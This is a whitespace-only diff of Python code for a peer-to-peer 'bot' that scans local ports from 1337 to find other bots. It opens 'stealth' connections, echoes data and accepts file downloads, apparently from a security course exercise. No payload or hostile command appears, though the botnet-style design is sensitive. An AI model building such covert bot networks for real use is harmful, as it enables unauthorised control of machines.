@@ -1,13 +1,11 @@
 import socket
 import threading
-
 from lib.comms import StealthConn
 from lib.files import p2p_download_file
 
 # Keep track of where our server is
 # This is primarily so we don't try to talk to ourselves
 server_port = 1337
-
 
 def find_bot():
     print("Finding another bot...")
@@ -27,7 +25,6 @@ def find_bot():
                 print("No bot was listening on port %d" % port)
                 port += 1
 
-
 def echo_server(sconn):
     while 1:
         data = sconn.recv()
@@ -37,7 +34,6 @@ def echo_server(sconn):
             print("Closing connection...")
             sconn.close()
             return
-
 
 def accept_connection(conn):
     try:
@@ -50,7 +46,6 @@ def accept_connection(conn):
             p2p_download_file(sconn)
     except socket.error:
         print("Connection closed unexpectedly")
-
 
 def bot_server():
     global server_port
